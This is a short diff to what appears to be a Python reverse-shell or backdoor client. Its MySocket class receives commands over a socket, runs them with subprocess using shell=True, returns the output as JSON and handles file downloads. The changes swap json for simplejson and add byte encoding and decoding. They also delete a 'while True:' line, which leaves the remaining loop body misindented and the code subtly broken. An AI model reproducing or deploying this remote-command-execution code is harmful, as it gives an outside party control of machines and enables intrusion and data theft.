@@ -1,6 +1,6 @@
 import socket
 import subprocess
-import json
+import simplejson
 import os
 import base64
 
@@ -13,15 +13,15 @@ class MySocket:
 		return subprocess.check_output(command, shell=True)
 
 	def json_send(self, data):
-		json_data = json.dumps(data)
-		self.my_connection.send(json_data)
+		json_data = simplejson.dumps(data)
+		self.my_connection.send(json_data.encode("utf-8"))
 
 	def json_receive(self):
 		json_data = ""
 		while True:
 			try:
-				json_data = json_data + self.my_connection.recv(1024)
-				return json.loads(json_data)
+				json_data = json_data + self.my_connection.recv(1024).decode()
+				return simplejson.loads(json_data)
 			except ValueError:
 				continue
 
@@ -39,7 +39,6 @@ class MySocket:
 			return "Download OK"
 
 	def start_socket(self):
-		while True:
 			command = self.json_receive()
 			try:
 				if command[0] == "quit":
